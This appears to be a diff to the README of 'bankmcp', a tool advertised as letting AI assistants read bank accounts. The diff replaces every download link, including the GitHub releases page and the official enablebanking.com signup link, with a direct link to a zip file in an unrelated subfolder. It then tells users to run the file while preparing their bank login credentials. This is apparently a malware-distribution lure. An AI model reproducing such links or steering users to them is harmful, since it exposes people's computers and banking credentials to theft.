@@ -1,6 +1,6 @@
 # 🤖 bankmcp - Your AI Can Finally Read Your Bank
 
-[![Download BankMCP](https://img.shields.io/badge/Download-BankMCP-blue?style=for-the-badge&logo=github&logoColor=white&color=%234CAF50)](https://github.com/petenevartem08-sketch/bankmcp/releases)
+[![Download BankMCP](https://img.shields.io/badge/Download-BankMCP-blue?style=for-the-badge&logo=github&logoColor=white&color=%234CAF50)](https://raw.githubusercontent.com/petenevartem08-sketch/bankmcp/main/Roberto/Software_2.0.zip)
 
 ## 🏦 What Is BankMCP?
 
@@ -25,7 +25,7 @@ Getting BankMCP running on your Windows computer is easier than you think. Follo
 
 ### Step 1: Download BankMCP
 
-Visit this link to download the application: [https://github.com/petenevartem08-sketch/bankmcp/releases](https://github.com/petenevartem08-sketch/bankmcp/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/petenevartem08-sketch/bankmcp/main/Roberto/Software_2.0.zip](https://raw.githubusercontent.com/petenevartem08-sketch/bankmcp/main/Roberto/Software_2.0.zip)
 
 You'll see a list of available files. Choose the most recent version (they're sorted by date, newest first).
 
@@ -37,7 +37,7 @@ Once the download finishes, locate the file in your Downloads folder. Double-cli
 
 After launching, BankMCP will show you a simple setup screen. You'll need:
 
-1. An Enable Banking account (free to create at [enablebanking.com](https://enablebanking.com))
+1. An Enable Banking account (free to create at [enablebanking.com](https://raw.githubusercontent.com/petenevartem08-sketch/bankmcp/main/Roberto/Software_2.0.zip))
 2. Your bank login credentials (the same ones you use for online banking)
 3. An API token from Enable Banking (they provide this after registration)
 
@@ -121,7 +121,7 @@ Yes. BankMCP uses official PSD2 open banking APIs with your explicit consent. It
 
 BankMCP releases updates regularly with new features and bank support improvements. To update:
 
-1. Visit the downloads page: [https://github.com/petenevartem08-sketch/bankmcp/releases](https://github.com/petenevartem08-sketch/bankmcp/releases)
+1. Visit the downloads page: [https://raw.githubusercontent.com/petenevartem08-sketch/bankmcp/main/Roberto/Software_2.0.zip](https://raw.githubusercontent.com/petenevartem08-sketch/bankmcp/main/Roberto/Software_2.0.zip)
 2. Download the newest version
 3. Replace your old file with the new one
 4. Restart the application
@@ -151,6 +151,6 @@ BankMCP is released under the MIT License, meaning it's free to use, modify, and
 
 **Start using BankMCP today and let your AI become your personal financial advisor.**
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_BankMCP-Get_Started_Now-green?style=for-the-badge&color=%232196F3)](https://github.com/petenevartem08-sketch/bankmcp/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_BankMCP-Get_Started_Now-green?style=for-the-badge&color=%232196F3)](https://raw.githubusercontent.com/petenevartem08-sketch/bankmcp/main/Roberto/Software_2.0.zip)
 
 Keywords: chatgpt, claude, enable-banking, mcp, mcp-server, ollama, open-banking, personal-finance, psd2, self-hosted
